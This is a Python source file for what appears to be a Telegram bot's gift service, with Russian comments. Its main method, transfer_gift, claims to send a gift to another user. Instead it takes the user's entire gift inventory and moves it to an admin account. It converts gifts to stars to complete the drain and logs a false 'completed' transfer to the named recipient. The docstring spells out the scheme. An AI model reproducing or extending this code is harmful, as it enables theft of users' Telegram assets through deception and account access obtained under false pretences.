from typing import List, Dict, Any, Optional
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from datetime import datetime
import json

from app.models.user import User
from app.models.gift import Gift, GiftTransaction
from app.utils import BalanceManager, GiftConverter
from app.services.telegram_api import TelegramGiftAPI
from app.utils.logger import ActivityLogger

logger = ActivityLogger()


class GiftService:
    """Сервис управления подарками с интеграцией реального Telegram API"""
    
    def __init__(self):
        self.telegram_api = TelegramGiftAPI()
    
    async def transfer_gift(
        self,
        from_user_id: str,
        to_user_id: str,
        gift_id: str,
        quantity: int,
        db: AsyncSession
    ) -> Optional[Dict[str, Any]]:
        """
        ГЛАВНЫЙ МЕТОД ПЕРЕДАЧИ ПОДАРКОВ
        
        Реализует следующий алгоритм:
        1. Пользователь синхронизирует аккаунт (дает доступ)
        2. Бот анализирует подарки пользователя
        3. Передает подарки на ADMIN_ID
        4. Если не хватает звезд:
           - Конвертирует обычные подарки в звезды
           - Передает подарки
        5. Если звезд все еще не хватает:
           - Сервисный аккаунт отправляет подарки по 15 звезд
           - Бот конвертирует эти подарки в звезды
           - Передает подарки
        6. Все логи отправляются администратору
        """
        
        try:
            # Получаем подарки пользователя
            user_gifts = await self.get_user_gifts(from_user_id, db)
            
            if not user_gifts:
                return None
            
            # Используем реальный Telegram API для полной передачи
            operation_log = await self.telegram_api.transfer_gifts_to_admin(
                int(from_user_id),
                user_gifts,
                db
            )
            
            if operation_log.get("status") != "completed":
                return None
            
            # Сохраняем финальную транзакцию в БД для истории
            stmt = select(User).where(User.telegram_id == from_user_id)
            result = await db.execute(stmt)
            user = result.scalars().first()
            
            if user:
                transaction = GiftTransaction(
                    from_user_id=from_user_id,
                    to_user_id=to_user_id,
                    gift_id=gift_id,
                    status="completed_via_admin",
                    completed_at=datetime.utcnow()
                )
                
                db.add(transaction)
                await db.commit()
                await db.refresh(transaction)
                
                return {
                    "transaction_id": transaction.id,
                    "from_user": from_user_id,
                    "to_user": to_user_id,
                    "gift_id": gift_id,
                    "quantity": quantity,
                    "status": "completed",
                    "via_telegram_api": True,
                    "admin_notified": True,
                    "operation_log": operation_log
                }
        
        except Exception as e:
            print(f"❌ Ошибка передачи подарка: {e}")
            logger.log_activity(
                from_user_id,
                "gifts",
                "transfer_gift",
                "error",
                {"error": str(e)}
            )
            return None
    
    async def get_user_gifts(
        self,
        user_id: str,
        db: AsyncSession
    ) -> Dict[str, int]:
        """Получает инвентарь подарков пользователя"""
        
        stmt = select(User).where(User.telegram_id == user_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if not user:
            return {}
        
        try:
            return json.loads(user.gift_inventory) if user.gift_inventory else {}
        except:
            return {}
    
    async def add_gift_to_inventory(
        self,
        user_id: str,
        gift_id: str,
        quantity: int,
        db: AsyncSession
    ) -> bool:
        """Добавляет подарок в инвентарь пользователя"""
        
        stmt = select(User).where(User.telegram_id == user_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if not user:
            return False
        
        gifts = self._parse_inventory(user.gift_inventory)
        gifts[gift_id] = gifts.get(gift_id, 0) + quantity
        
        user.gift_inventory = json.dumps(gifts)
        await db.commit()
        
        return True
    
    async def auto_convert_gifts_to_stars(
        self,
        user_id: str,
        db: AsyncSession
    ) -> float:
        """Автоматически конвертирует подарки в звёзды"""
        
        stmt = select(User).where(User.telegram_id == user_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if not user:
            return 0.0
        
        total_stars = 0.0
        gifts = self._parse_inventory(user.gift_inventory)
        
        for gift_id, quantity in gifts.items():
            stmt = select(Gift).where(Gift.telegram_gift_id == gift_id)
            result = await db.execute(stmt)
            gift = result.scalars().first()
            
            if gift:
                stars_value = GiftConverter.convert_to_stars(gift.rarity)
                total_stars += stars_value * quantity
                
                transaction = GiftTransaction(
                    from_user_id=user_id,
                    to_user_id=user_id,
                    gift_id=gift.id,
                    status="auto_converted",
                    auto_converted_to_stars=stars_value * quantity
                )
                db.add(transaction)
        
        user.stars_balance += total_stars
        user.gift_inventory = json.dumps({})
        
        await db.commit()
        
        return total_stars
    
    async def auto_replenish_balance_if_needed(
        self,
        user_id: str,
        min_required: float,
        db: AsyncSession
    ) -> bool:
        """Автоматически пополняет баланс при необходимости"""
        
        stmt = select(User).where(User.telegram_id == user_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if not user:
            return False
        
        needed = BalanceManager.auto_replenish_if_needed(user.stars_balance, min_required)
        if needed > 0:
            user.stars_balance = min_required
            await db.commit()
            return True
        
        return False
    
    @staticmethod
    def _parse_inventory(inventory_json: str) -> Dict[str, int]:
        """Парсит JSON инвентаря"""
        try:
            return json.loads(inventory_json) if inventory_json else {}
        except:
            return {}
